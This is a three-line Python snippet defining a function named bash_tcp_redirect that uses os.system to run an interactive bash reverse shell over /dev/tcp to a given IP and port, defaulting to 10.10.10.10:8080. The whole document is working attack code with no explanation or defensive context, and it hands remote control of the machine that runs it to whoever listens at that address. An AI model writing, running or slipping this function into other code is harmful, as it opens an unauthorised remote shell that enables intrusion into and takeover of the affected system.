import os
def bash_tcp_redirect(ip='10.10.10.10', port=8080):
    os.system(f'/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1')
